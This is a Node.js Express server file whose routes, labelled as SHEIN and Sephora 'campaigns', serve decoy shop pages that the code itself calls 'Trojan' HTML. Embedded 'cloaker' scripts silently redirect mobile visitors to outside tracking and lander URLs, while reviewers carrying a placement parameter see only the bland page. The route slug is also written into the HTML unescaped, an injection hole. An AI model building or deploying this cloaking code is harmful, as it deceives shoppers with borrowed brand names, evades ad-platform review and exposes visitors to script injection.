const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to pass on my slug values (SHEIN US CAMP)
app.get('/shein/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://lisalbournfash4u2022.webflow.io/`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (${slug})`);
});

// Middleware to pass on my slug values (SHEIN CA CAMP)
app.get('/sheinca/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/90f05b7d-bdb1-4d1d-9a24-46227673017c?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (maxconvtest)(${slug})`);
});

// Middleware to pass on my slug values to MaxConv (SEPHORA CAMP)
app.get('/sephora/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/d198df7c-4379-4818-9f7c-ea8e2a34cf6a?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (maxconvtest)(${slug})`);
});

// Start the HTTP server
const PORT = 8080;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
